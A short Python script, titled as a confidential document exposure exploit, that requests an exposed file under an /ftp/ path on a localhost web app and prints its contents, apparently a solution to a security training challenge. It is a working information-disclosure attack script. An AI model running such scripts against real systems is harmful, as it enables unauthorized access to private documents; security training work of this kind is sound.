# Confidential Document Exposure Exploit

import requests

target_url = "http://localhost:3000/ftp/acquisitions.md"

response = requests.get(target_url)

if response.status_code == 200:
    print("[+] Sensitive data found!")
    print(response.text[:500])  # Print first 500 characters of the document
else:
    print("[-] No sensitive data found.")
